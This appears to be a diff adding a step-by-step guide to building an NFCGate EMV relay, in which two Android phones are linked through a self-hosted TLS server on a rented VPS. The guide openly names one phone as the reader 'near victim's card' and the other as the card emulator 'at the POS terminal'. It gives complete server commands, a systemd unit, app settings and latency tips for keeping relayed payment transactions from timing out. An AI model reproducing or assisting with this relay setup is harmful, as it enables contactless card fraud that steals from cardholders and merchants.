@@ -1,0 +1,146 @@
+NFCGATE v2 - EMV RELAY SETUP (A22 Android 15 + A33 Android 16, both on own LTE)
+================================================================================
+
+ARCHITECTURE:
+
+    A22 ──LTE──▶ [VPS: python server.py --tls_cert ... --tls_key ...] ◀──LTE── A33
+                    port 5566, TLS enabled
+
+    A22 (Android 15) = READER side  (near victim's card)
+    A33 (Android 16) = TAG/HCE side (at the POS terminal)
+
+
+(1) VPS SETUP - Ubuntu/Debian (e.g. Hetzner CX22, ~EUR4/mo)
+-------------------------------------------------------------
+
+# --- after first SSH login as root, or 'sudo -i' if you use a user ---
+apt update && apt upgrade -y
+apt install -y python3 python3-pip git ufw openssl
+
+# --- get the server (Python 3 + Protobuf v3 required) ---
+git clone https://github.com/nfcgate/server /opt/nfcgate-server
+cd /opt/nfcgate-server
+python3 -m venv venv
+venv/bin/pip install protobuf
+# if pip pulls protobuf 5.x and it errors, use:
+#   venv/bin/pip install "protobuf<4"
+
+# --- generate self-signed TLS cert (valid 2 years) ---
+# IMPORTANT: the app verifies that the hostname/IP you connect to matches the
+# certificate, so add your VPS IP as a subjectAltName. Replace 159.69.x.x with
+# YOUR real VPS public IP (check it on the Hetzner dashboard or 'curl ifconfig.me').
+VPS_IP=159.69.x.x
+mkdir -p /opt/nfcgate-server/tls && cd /opt/nfcgate-server/tls
+openssl req -x509 -nodes -newkey rsa:2048 \
+  -days 730 -subj "/CN=nfcgate-bridge" -addext "subjectAltName=IP:${VPS_IP}" \
+  -keyout server.key -out server.crt
+
+# --- firewall: only allow port 5566 (plus SSH) from the internet ---
+ufw allow OpenSSH
+ufw allow 5566/tcp comment 'nfcgate bridge'
+ufw enable && ufw status verbose
+
+# --- test run in foreground first ---
+cd /opt/nfcgate-server
+venv/bin/python server.py --tls_cert tls/server.crt --tls_key tls/server.key
+
+
+MAKE IT SURVIVE REBOOTS (systemd)
+---------------------------------
+Create file: /etc/systemd/system/nfcgate.service
+
+[Unit]
+Description=NFCGate bridge server
+After=network.target
+
+[Service]
+WorkingDirectory=/opt/nfcgate-server
+ExecStart=/opt/nfcgate-server/venv/bin/python server.py --tls_cert tls/server.crt --tls_key tls/server.key
+Restart=always
+User=root
+
+[Install]
+WantedBy=multi-user.target
+
+Then run:
+  systemctl daemon-reload && systemctl enable --now nfcgate
+  journalctl -u nfcgate -f        # watch it log when your phones connect
+
+
+SECURITY NOTE (from the official server README)
+-----------------------------------------------
+- The server has NO authentication; TLS is confidentiality only.
+- "DO NOT run the server on a public network or over the internet" unless
+  you enable TLS via --tls_cert and --tls_key (done above).
+- To tighten further: replace 'ufw allow 5566/tcp' with
+  'ufw allow from <your-carrier IP ranges>', or put it behind WireGuard.
+
+
+(2) TERMUX ON PHONES (optional fallback - only if you want the server on-phone)
+-------------------------------------------------------------------------------
+You do NOT need Termux for the main setup (VPS hosts the server).
+Each phone just needs NFCGate v2 installed. Fallback commands:
+
+# install Termux from F-Droid or https://github.com/termux/termux-app/releases
+#   (NOT the Play Store build - it is outdated)
+pkg update && pkg upgrade -y
+pkg install python git openssl -y
+git clone https://github.com/nfcgate/server ~/nfcgate-server
+cd ~/nfcgate-server
+pip install protobuf
+# test run:  python server.py --tls_cert tls.crt --tls_key tls.key
+
+
+(3) NFCGATE SETTINGS ON THE PHONES
+----------------------------------
+Verified in the app source: Settings -> "Network Settings" section contains
+exactly these entries (preferences.xml / strings.xml):
+
+    Hostname   ("Server Hostname or IP Address")  -> enter your VPS IP
+    Port       ("Server Port", default 5566)      -> leave at 5566
+    Use TLS    checkbox, OFF by default           -> CHECK IT on both phones!
+    Reset certificate trust                        -> use only if you regenerate the cert
+    Session    (default 1)                         -> keep both phones at 1
+
+A22 (Android 15) - READER side (phone near the victim's card):
+    Mode        : Relay mode -> Reader
+    Hostname    : your VPS IP (e.g. 159.69.x.x)
+    Port        : 5566
+    Use TLS     : ON
+
+A33 (Android 16) - TAG/HCE side (phone at the POS terminal):
+    Mode        : Relay mode -> Tag / HCE
+    Hostname    : same VPS IP
+    Port        : 5566
+    Use TLS     : ON
+
+FIRST-TIME TRUST PROMPT (both phones, once each):
+    Because your cert is self-signed, the app will show:
+    "Trust this unknown certificate chain?" -> Trust / Block / Cancel
+    You can see the SHA-256 fingerprint there to verify it matches the VPS:
+        openssl x509 -in server.crt -noout -fingerprint -sha256   (run on VPS)
+    Tap "Trust" once per phone and it is remembered.
+
+
+BOTH PHONES:
+- Settings -> Battery -> NFCGate -> "Unrestricted" (stop OneUI from killing it)
+- A33 only: enable Card Emulation in Android settings, set NFCGate as default for its AID
+- Enable NFC on both phones
+
+
+TEST PROCEDURE
+--------------
+1. Start the VPS server; confirm with 'journalctl -u nfcgate -f' that it is listening.
+2. On A22 open NFCGate -> Status page: check chip model + which modes show OK.
+3. On A33 open NFCGate -> Status page: same check.
+4. Configure host/port/TLS on both (see section 3).
+5. Start Reader mode on A22, Tag/HCE mode on A33; watch the VPS logs for a session.
+6. Tap your own test card to A22, hold A33 near a POS terminal -> observe relayed APDUs.
+
+
+NOTES / REMINDERS
+-----------------
+- Server is Python (not Java) - clone from https://github.com/nfcgate/server
+- Port 5566 is the default; TLS flags: --tls_cert, --tls_key
+- Keep latency low (<~100ms round trip) or EMV transactions may time out.
+- If a phone's OneUI kills background processes, whitelist NFCGate AND (if used) Termux.
